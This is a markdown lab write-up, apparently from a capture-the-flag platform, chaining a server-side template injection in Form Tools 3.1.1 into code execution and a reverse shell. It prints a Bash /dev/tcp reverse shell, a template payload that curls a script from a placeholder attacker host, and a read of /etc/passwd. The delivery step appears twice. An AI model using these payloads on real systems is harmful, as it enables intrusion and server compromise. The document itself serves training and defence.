# Advanced Vulnerability Exploitation – SSTI to RCE Chain

## Overview

This section documents an advanced exploitation workflow performed against a
vulnerable web application, where a **Server-Side Template Injection (SSTI)**
vulnerability was identified, confirmed, and successfully chained into
**Remote Code Execution (RCE)** and a full interactive reverse shell.

The objective of this task was to demonstrate:

- Manual vulnerability discovery
- Exploit reasoning and validation
- Exploit chaining (SSTI → RCE → Shell)
- Realistic impact demonstration

Rather than relying on automated exploitation frameworks, all steps were
performed manually to understand the application behavior and exploit surface.

---

## Target Information

- Host: `ssti.thm`
- Application: Form Tools 3.1.1
- Vulnerability: CVE-2024-22722 (Server-Side Template Injection)
- Exploitation Context: Web application input field (Group Name)

---

## Exploit Chain Summary

| Exploit ID | Description                     | Target   | Status  | Payload Type      |
|------------|----------------------------------|----------|----------|-------------------|
| 004        | SSTI → RCE → Reverse Shell Chain | ssti.thm | Success  | Bash reverse shell |

---

## Phase 1: Identifying the Injection Surface

Manual application navigation revealed the following path:

```
Forms → Views → Add Group → Group Name field
```

Client-side inspection showed that user input was sent directly to backend logic
without proper sanitization.

![Unvalidated input](WEEK-3/Evidence/unvalidated_user_input_ajax.png)

This indicated a possible server-side injection point.

---

## Phase 2: Version Identification & CVE Mapping

The application version was identified as:

**Form Tools 3.1.1**

![Version identification](WEEK-3/Evidence/version_identification.png)

Public vulnerability research confirmed:

- **CVE-2024-22722**
- Vulnerability Type: Server-Side Template Injection
- Affected parameter: Group Name field
- Impact: Remote command execution

![CVE reference](WEEK-3/Evidence/cve_reference.png)

---

## Phase 3: SSTI Confirmation

A non-destructive template expression was injected to validate server-side
template evaluation.

![SSTI test payload](WEEK-3/Evidence/SSTI_identification.png)

The application evaluated the expression instead of rendering it literally:

![SSTI confirmed](WEEK-3/Evidence/SSTI_confirmation.png)

This confirmed active server-side template processing of user input.

---

## Phase 4: Exploitation – SSTI to Remote Code Execution

Further testing revealed that the template engine allowed command execution
consistent with **Smarty-style syntax**.

Command execution was validated:

![Smarty execution test](WEEK-3/Evidence/smarty_ssti_identification.png)

System identity was retrieved:

![ID execution](WEEK-3/Evidence/id_execution.png)

Execution context:

```
User: www-data
```

At this stage, exploitation progressed from input injection to full RCE.

---

## Phase 5: Reverse Shell Establishment

### Binary Environment Validation

Available binaries were checked before crafting the payload.

![Binary identification](WEEK-3/Evidence/binary_identification.png)

---

### Reverse Shell Payload

A Bash reverse shell script was created:

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```
Payload Hosting & Delivery

The payload was hosted using a temporary HTTP server and fetched via the
vulnerable SSTI input:

```
{system('curl http://<ATTACKER_IP>:8000/shell.sh -o /tmp/shell.sh')}

```
### Payload Hosting & Delivery

The payload was hosted using a temporary HTTP server and fetched via the
vulnerable SSTI input:
```
{system('curl http://<ATTACKER_IP>:8000/shell.sh -o /tmp/shell.sh')}
```

![project hello](WEEK-3/Evidence/file_fetched.png)

---

### Payload Verification

The payload file presence on the target system was confirmed:

![](WEEK-3/Evidence/revshell_added.png)

---

### Payload Execution

The script was executed using the same SSTI execution path:

![](WEEK-3/Evidence/payload_execution.png)

---

### Reverse Shell Received

A listener on the attacker machine received the incoming connection:

![](WEEK-3/Evidence/Shell_access.png)

Shell context confirmed:

```
www-data
```


---

## Phase 6: Shell Stabilization

The initial shell lacked job control and full terminal capabilities. The session
was stabilized to allow reliable post-exploitation interaction.

[](WEEK-3/Evidence/stabilized_shell.png)

---

## Phase 7: Post-Exploitation Validation

To confirm system-level access, sensitive system files were accessed:

```
/etc/passwd
```


[](WEEK-3/Evidence/post_exploitation_file_read.png)

This demonstrated full command execution capability under the compromised user.

---

## Outcome

This advanced exploitation exercise demonstrated:

- Manual identification of SSTI  
- CVE mapping and validation  
- Exploit chaining to RCE  
- Reverse shell establishment  
- Shell stabilization  
- Post-exploitation system access validation  

---

## Security Impact

This vulnerability allows:

- Arbitrary command execution  
- Full server compromise  
- Data exfiltration  
- Lateral movement potential  

A single improperly validated input field was sufficient to compromise the
entire application host.

---

## Mitigation Recommendations

- Strict server-side input validation  
- Secure template rendering (disable unsafe functions)  
- Template sandboxing  
- Regular dependency patching  
- Continuous application security testing  


